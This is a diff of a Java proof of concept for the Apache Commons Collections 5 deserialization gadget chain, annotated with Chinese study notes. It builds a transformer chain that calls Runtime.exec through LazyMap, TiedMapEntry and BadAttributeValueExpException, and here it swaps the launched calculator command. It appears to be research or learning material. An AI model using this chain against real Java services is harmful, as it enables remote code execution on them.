@@ -10,13 +10,15 @@ import org.apache.commons.collections.map.LazyMap;
 import javax.management.BadAttributeValueExpException;
 import java.io.*;
 import java.lang.reflect.Field;
+import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
 import java.util.HashMap;
 import java.util.Map;
+import java.util.logging.MemoryHandler;
 
 public class CommonCollection5 {
 
-    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {
+    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException {
         /*
         CommonCollection5 可能是被推荐的最多的一个PoC了，至少在CommonCollection1中， 就遇到过这样的问题，
         在前几篇调试，以及这个链接中  http://www.thegreycorner.com/2016/05/commoncollections-deserialization.html
@@ -49,7 +51,7 @@ public class CommonCollection5 {
         InvokerTransformer invokerTransformer = new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null});
         InvokerTransformer invokerTransformer1 = new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null});
 //        Runtime.getRuntime().exec();
-        InvokerTransformer invokerTransformer2 = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"galculator"});
+        InvokerTransformer invokerTransformer2 = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"kcalc"});
         // 加不加这个，都不行。
         ConstantTransformer constantTransformer1 = new ConstantTransformer("1");
 
@@ -58,6 +60,14 @@ public class CommonCollection5 {
         ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
 //        chainedTransformer.transform(1);
 
+//        Class clazz = Runtime.class;
+//        Method method = clazz.getMethod("getRuntime");
+//        Object object = method.invoke(Runtime.class);
+//
+//        Method method1 = object.getClass().getMethod("exec", String.class);
+//        Object object2 = method1.invoke(object, "kcalc");
+
+
         /*
         又通过LazyMap封装，这里我们也测试过， 即decorade 可以将transform作为参数， 在调用`heapify`时会触发compare的translate方法
          */
@@ -65,7 +75,6 @@ public class CommonCollection5 {
         HashMap hashMap = new HashMap();
         Map lazyMap;
         lazyMap = LazyMap.decorate(hashMap, chainedTransformer);
-
         /*
         下面看一下`TiedMapEntry` 和  BadAttributeValueExpException 的关系，
         首先是`BadAttributeValueExpException`， 可以看到，其`readObject`会在取到 val的值后，判断其类型，如果在
@@ -117,6 +126,7 @@ public class CommonCollection5 {
          */
 
         TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "foo");
+//        tiedMapEntry.toString();
 
         BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
         /*
